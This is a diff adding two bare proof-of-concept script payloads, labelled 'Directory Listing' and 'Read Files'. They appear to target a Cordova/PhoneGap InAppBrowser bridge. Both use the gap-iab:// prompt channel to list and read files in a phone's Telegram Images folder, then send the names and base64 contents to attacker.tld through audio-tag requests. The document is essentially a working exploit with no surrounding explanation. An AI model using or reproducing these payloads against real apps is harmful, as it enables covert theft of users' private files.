@@ -1,0 +1,12 @@
+Directory Listing
+
+<script>
+prompt("","gap-iab://InAppBrowser');window.resolveLocalFileSystemURL(\"file:///sdcard/Telegram/Telegram%20Images/\",function(dirEntry){dirEntry.createReader().readEntries(function(entries){result=\"\";for(i=0;i<entries.length;i++){result+=entries[i].name+\";\";}document.write(\"<audio src=https://attacker.tld/\"+btoa(result)+\">\")});});//")
+</script>
+
+
+Read Files
+
+<script>
+prompt("","gap-iab://InAppBrowser');window.resolveLocalFileSystemURL(\"file:///sdcard/Telegram/Telegram%20Images/\",function(dirEntry){dirEntry.createReader().readEntries(function(entries){for(i=0;i<entries.length;i++){document.write(\"<audio src=https://attacker.tld/filename:\"+btoa(entries[i].name)+\">\");entries[i].file(function(file){reader=new FileReader();reader.onloadend=function(){document.write(\"<audio src=https://attacker.tld/\"+this.result+\">\");};reader.readAsDataURL(file);});}});});//")
+</script>
